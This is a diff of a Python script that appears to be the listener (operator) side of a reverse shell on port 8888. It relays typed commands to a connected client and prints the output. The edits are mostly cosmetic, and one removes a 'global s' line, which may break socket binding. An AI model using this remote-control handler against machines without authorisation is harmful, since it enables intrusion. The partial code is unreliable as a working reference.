@@ -1,22 +1,13 @@
 # Import the necessary libraries
 
+# Import the necessary functions from the socket library
+from socket import AF_INET, SO_REUSEADDR, SOCK_STREAM, SOL_SOCKET, error, socket
 from sys import exit
-
 from time import sleep
 
-# Import the necessary functions from the socket library
-from socket import AF_INET
-from socket import error
-from socket import socket
-from socket import SOCK_STREAM
-from socket import SOL_SOCKET
-from socket import SO_REUSEADDR
 
 # Recursive function to try to bind to the socket
 def bind_socket():
-
-    # As we need to bind the uninitialised socket, calling it
-    global s
 
     # Try to complete the binding of the socket
     try:
@@ -47,8 +38,9 @@ def bind_socket():
         # Retry binding by calling the same function recursively
         bind_socket()
 
+
 # Host is initialised
-host = ''
+host = ""
 
 # Standard port is initialised
 port = 8888
@@ -87,13 +79,14 @@ print("Server Listening...")
 conn, address = s.accept()
 
 # Appropriate message is displayed
-print("Connection has been established! |", "IP", address[0], "| Port", address[1])
+print("Connection has been established! |", "IP", address[0], "| Port",
+      address[1])
 
 # The client sends the working directory to print before entering the command
 # It needs to be displayed to the user for him to learn the current working directory
 
 # The received bytes have to be decoded to string
-print(conn.recv(2048).decode("utf-8"), end = "")
+print(conn.recv(2048).decode("utf-8"), end="")
 
 # We will continue to take shell commands till we don't exit
 while True:
@@ -102,7 +95,7 @@ while True:
     cmd = str(input())
 
     # If the command to exit the shell is entered, exit the shell
-    if cmd == 'exit':
+    if cmd == "exit":
 
         # Tell the client to close the connection
         # Send closing message to the client
@@ -130,4 +123,4 @@ while True:
         # As the reverse shell runs on the client it is sent to the server which displays it
 
         # Decode the reveived bytes to a string to display string output
-        print(conn.recv(2048).decode("utf-8"), end = "")
+        print(conn.recv(2048).decode("utf-8"), end="")
